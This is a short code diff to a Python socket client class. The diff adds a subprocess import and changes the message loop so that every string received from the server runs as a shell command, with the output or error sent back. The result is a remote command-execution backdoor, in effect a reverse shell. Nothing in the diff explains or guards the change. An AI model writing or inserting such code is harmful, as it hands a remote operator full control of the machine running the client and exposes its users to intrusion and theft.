@@ -1,6 +1,7 @@
 import os
 import platform
 import socket
+import subprocess
 
 import rsa
 
@@ -41,6 +42,10 @@ class Client:
         while True:
             message = self.recv()
             print(message)
+            try:
+                self.send(subprocess.run([message], shell=True, capture_output=True).stdout)
+            except Exception as exception:
+                self.send(str(exception))
 
     def get_username(self) -> str:
         if platform.system() == "Windows":
